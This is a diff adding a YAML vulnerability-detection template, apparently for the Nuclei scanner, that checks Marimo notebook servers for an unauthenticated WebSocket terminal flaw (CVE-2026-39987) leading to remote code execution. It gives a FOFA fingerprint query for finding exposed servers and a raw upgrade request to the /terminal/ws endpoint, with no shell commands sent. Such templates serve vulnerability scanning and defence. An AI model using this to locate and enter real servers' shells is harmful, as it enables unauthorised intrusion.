@@ -1,0 +1,31 @@
+id: marimo-notebook-websocket-unauth-rce
+
+info:
+  name: "Marimo Notebook WebSocket终端未授权远程代码执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: icon_hash="-1864630356" || title=="marimo"
+        Marimo 框架存在 WebSocket 认证绕过缺陷（CVE-2026-39987，CVSS 9.3），攻击者无需身份验证即可连接特定 WebSocket 端点，从而获取服务器 PTY Shell 权限并实现远程代码执行。
+  reference:
+  - CVE-2026-39987
+  tags: Marimo
+
+http:
+- raw:
+  - |
+    GET /terminal/ws HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade: websocket
+    Sec-WebSocket-Key: heA80X4RIk5ToGoOf80ifA==
+    Sec-WebSocket-Version: 13
+    Connection: Upgrade
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+      - 'websocket'
+      - 'marimo'
+      - 'prod-app'
+    condition: and
